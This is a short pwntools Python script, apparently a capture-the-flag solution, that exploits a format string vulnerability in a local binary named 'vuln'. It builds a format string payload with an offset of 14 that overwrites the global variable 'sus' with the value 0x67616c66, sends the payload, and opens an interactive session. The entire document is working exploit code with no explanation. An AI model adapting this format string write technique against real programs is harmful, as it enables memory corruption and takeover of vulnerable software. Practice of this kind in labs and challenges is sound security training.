from pwn import *

exe = ELF("./vuln")
context.binary = exe

p = process("./vuln")
p.recvuntil("What do you have to say?\n")

writes = {exe.sym["sus"]:0x67616c66}
payload = fmtstr_payload(14, writes) #Update 14 if needed
print(payload)

p.sendline(payload)

p.interactive()